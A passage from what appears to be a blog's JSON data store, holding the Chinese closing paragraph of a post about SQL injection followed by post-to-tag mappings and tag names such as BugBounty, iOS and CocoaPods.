href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h3><p>上面的列表并不详尽，仍然可以根据应用程序逻辑利用 SQL 注入。显示的代码示例基于 PHP，但逻辑适用于所有常见语言和库。</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"clh5pn0bk00007ex2brm8hzi9","tag_id":"clh5pn0bp00027ex2d8q7e068","_id":"clh5pn0br00057ex2eqtydo3k"},{"post_id":"clh5pn0bo00017ex23as25naf","tag_id":"clh5pn0br00047ex24gfddq8o","_id":"clh5pn0bs00087ex22x2o5suv"},{"post_id":"clh5pn0bo00017ex23as25naf","tag_id":"clh5pn0br00067ex20pht941t","_id":"clh5pn0bs00097ex2ap7v6zku"},{"post_id":"clh5pn0bq00037ex235l278iv","tag_id":"clh5pn0bs00077ex21q44d580","_id":"clh5pn0bs000a7ex2f39gd56f"},{"post_id":"clh5pn0cs000b7ex26r3l17i3","tag_id":"clh5pn0ct000c7ex287ll845v","_id":"clh5pn0cu000d7ex29usu2tld"}],"Tag":[{"name":"BugBounty","_id":"clh5pn0bp00027ex2d8q7e068"},{"name":"iOS","_id":"clh5pn0br00047ex24gfddq8o"},{"name":"CocoaPods","_id":"clh5pn0br00067ex20pht941t"},{"name":"渗透 BugBounty 安全 Cybersecurity","_id":"clh5pn0bs00077ex21q44d580"},{"name":"Injection Cybersecurit 数据库安全","_id":"clh5pn0ct000c7ex287ll845v"}]}}